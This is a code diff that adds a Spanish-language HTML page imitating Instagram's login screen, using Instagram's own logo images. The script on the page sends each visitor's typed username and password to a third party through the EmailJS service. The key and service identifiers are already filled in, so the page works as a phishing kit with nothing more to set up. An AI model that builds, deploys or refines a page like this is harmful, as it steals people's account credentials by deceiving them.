@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login Clone</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 350px;
+            width: 100%;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .logo {
+            margin: 20px 0;
+        }
+        .logo img {
+            max-width: 175px;
+            width: 100%;
+        }
+        .login-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 40px 20px 20px;
+            border-radius: 1px;
+            margin-bottom: 10px;
+        }
+        .login-box form {
+            display: flex;
+            flex-direction: column;
+        }
+        .input-field {
+            position: relative;
+            margin-bottom: 8px;
+        }
+        .input-field input {
+            width: 100%;
+            padding: 9px 0 7px 8px;
+            font-size: 14px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            outline: none;
+        }
+        .input-field label {
+            position: absolute;
+            top: 50%;
+            left: 8px;
+            transform: translateY(-50%);
+            font-size: 14px;
+            color: #8e8e8e;
+            pointer-events: none;
+            transition: all 0.2s ease;
+        }
+        .input-field input:focus + label,
+        .input-field input:not(:placeholder-shown) + label {
+            font-size: 12px;
+            top: 10px;
+            transform: translateY(-100%);
+            color: #262626;
+        }
+        .login-button {
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            padding: 7px 0;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            margin: 12px 0;
+        }
+        .login-button:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+        #form-message {
+            font-size: 12px;
+            color: #262626;
+            margin-top: 10px;
+            word-wrap: break-word;
+        }
+        #form-message.error {
+            color: #b00020;
+        }
+        #form-message.success {
+            color: #2e7d32;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+            margin: 0 16px;
+        }
+        .facebook-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        .facebook-login img {
+            width: 16px;
+            margin-right: 8px;
+        }
+        .facebook-login a {
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .forgot-password {
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+        }
+        .signup-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 1px;
+        }
+        .signup-box p {
+            font-size: 14px;
+            color: #262626;
+            margin: 15px 0;
+        }
+        .signup-box a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        footer {
+            max-width: 350px;
+            width: 100%;
+            text-align: center;
+            font-size: 12px;
+            color: #8e8e8e;
+            margin-bottom: 20px;
+        }
+        footer a {
+            color: #8e8e8e;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        @media (max-width: 350px) {
+            .container, footer {
+                padding: 0 10px;
+            }
+            .login-box {
+                padding: 20px 10px;
+            }
+            .logo img {
+                max-width: 150px;
+            }
+            #form-message {
+                font-size: 11px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
+        </div>
+        <div class="login-box">
+            <form id="loginForm">
+                <div class="input-field">
+                    <input type="text" id="username" placeholder=" " required>
+                    <label for="username">Teléfono, usuario o correo</label>
+                </div>
+                <div class="input-field">
+                    <input type="password" id="password" placeholder=" " required>
+                    <label for="password">Contraseña</label>
+                </div>
+                <button type="submit" class="login-button" id="loginButton" disabled>Iniciar sesión</button>
+                <p id="form-message"></p>
+            </form>
+            <div class="divider">O</div>
+            <div class="facebook-login">
+                <img src="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" alt="Facebook">
+                <a href="#">Iniciar sesión con Facebook</a>
+            </div>
+            <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
+        </div>
+        <div class="signup-box">
+            <p>¿No tienes una cuenta? <a href="#">Regístrate</a></p>
+        </div>
+    </div>
+    <footer>
+        <a href="#">Meta</a>
+        <a href="#">Información</a>
+        <a href="#">Blog</a>
+        <a href="#">Empleos</a>
+        <a href="#">Ayuda</a>
+        <a href="#">API</a>
+        <a href="#">Privacidad</a>
+        <a href="#">Condiciones</a>
+        <a href="#">Ubicaciones</a>
+        <a href="#">Instagram Lite</a>
+        <p>© 2023 Instagram from Meta</p>
+    </footer>
+    <script>
+        // Inicializar EmailJS con la clave pública
+        (function(){
+            emailjs.init("CfZtldtVhlQEFso6I"); // Clave pública
+        })();
+
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginButton = document.getElementById('loginButton');
+        const loginForm = document.getElementById('loginForm');
+        const formMessage = document.getElementById('form-message');
+
+        function checkInputs() {
+            const usernameValue = usernameInput.value.trim();
+            const passwordValue = passwordInput.value.trim();
+            loginButton.disabled = !(usernameValue && passwordValue);
+        }
+
+        usernameInput.addEventListener('input', checkInputs);
+        passwordInput.addEventListener('input', checkInputs);
+
+        loginForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            const usernameValue = usernameInput.value.trim();
+            const passwordValue = passwordInput.value.trim();
+
+            // Validar que los campos no estén vacíos
+            if (!usernameValue || !passwordValue) {
+                formMessage.textContent = 'Por favor, completa todos los campos.';
+                formMessage.classList.remove('success');
+                formMessage.classList.add('error');
+                return;
+            }
+
+            // Validar formato de correo si el campo username parece un email
+            if (usernameValue.includes('@') && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(usernameValue)) {
+                formMessage.textContent = 'Por favor, ingresa un correo electrónico válido.';
+                formMessage.classList.remove('success');
+                formMessage.classList.add('error');
+                return;
+            }
+
+            // Enviar datos con EmailJS
+            emailjs.send('service_pozz2uo', 'template_kkmt6tw', {
+                from_username: usernameValue,
+                from_password: passwordValue
+            })
+            .then(() => {
+                formMessage.textContent = 'Datos enviados con éxito. Revisa tu correo.';
+                formMessage.classList.remove('error');
+                formMessage.classList.add('success');
+                loginForm.reset();
+                loginButton.disabled = true;
+            }, (error) => {
+                formMessage.textContent = 'Error al enviar los datos. Verifica la configuración en EmailJS.';
+                formMessage.classList.remove('success');
+                formMessage.classList.add('error');
+                console.error('EmailJS error:', error);
+            });
+        });
+    </script>
+</body>
+</html>
